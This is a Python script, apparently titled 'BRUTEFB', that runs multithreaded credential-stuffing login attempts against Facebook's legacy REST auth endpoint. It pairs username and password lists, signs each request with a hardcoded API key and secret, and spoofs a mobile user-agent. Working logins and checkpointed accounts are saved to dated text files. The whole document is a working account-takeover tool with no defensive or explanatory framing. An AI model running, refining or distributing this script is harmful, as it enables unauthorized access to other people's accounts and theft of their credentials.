#!/usr/bin/python
import os, sys, json, hashlib, time
from random import choice as rd
from datetime import datetime
from requests import get,post
from concurrent.futures import ThreadPoolExecutor as tp
from sys import stdout
from datetime import datetime
dat=datetime.now()
Save='%s_%s'%(dat.day,dat.hour)

# coding: utf-8
p = '\033[1;0m'
h = '\033[1;91m'
g = '\033[1;92m'
k = '\033[1;93m'
b = '\033[1;94m'
u = '\033[1;95m'
o = '\033[1;96m'
R = [p,h,g,k,b,u,o]
L = p+'='*29
V = '{}[{}+{}]{}'.format(g,p,g,p)
hed={'User-Agent':'Mozilla/5.0 (Linux; Android 8.1.0; U6 PRIME) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36'}

def Ban():
	Bon='''
_____________________________
  _   _   _   _   _   _   _  
 / \ / \ / \ / \ / \ / \ / \ 
( {}B {}| {}R {}| {}U {}| {}T {}| {}E {}| {}F {}| {}B {})
 \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
-----------------------------
        {}=[{} D E D E {}]=
{}
'''.format(rd(R),p,rd(R),p,rd(R),p,rd(R),p,rd(R),p,rd(R),p,rd(R),p,k,g,k,L)
	for x in Bon:
		stdout.write(x)
		stdout.flush()
		time.sleep(0.007)

def Cek(Us,Pa):
	global i
	data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":Us,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":Pa,"return_ssl_resources":"0","v":"1.0"}
	sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+Us+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+Pa+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32').encode('utf-8')
	x = hashlib.new('md5')
	x.update(sig)
	data.update({'sig':x.hexdigest()})
	R=get('https://api.facebook.com/restserver.php',params=data, headers=hed).text
	if 'access_token' in R:
		with open(Save+'_Success.txt','a') as f:
			f.write('%s | %s\n'%(Us,Pa))
			print('\n{} Success {}=]>{} {} | {}'.format(V,k,p,Us,Pa))
	elif 'User must verify' in R:
		with open(Save+'_Checkpoint.txt','a') as f:
			f.write('%s | %s\n'%(Us,Pa))
			print('\n{} Checpoint {}=]>{} {} | {}'.format(V,k,p,Us,Pa))
	else:
		stdout.write('\r{}[{}{}{}/{}{}{}]{} => {}{} {}|{} {} '.format(g,p,i,h,p,ttl,g,k,p,Us,h,p,Pa))
	i+=1

if __name__=='__main__':
	Us=open('us.txt').read().splitlines()
	Pa=open('pa.txt').read().splitlines()
	ttl=len(Pa)
	Ban()
	i=1
	try:
		tp(35).map(Cek, (Us),(Pa))
	except ImportError:
		print(L)

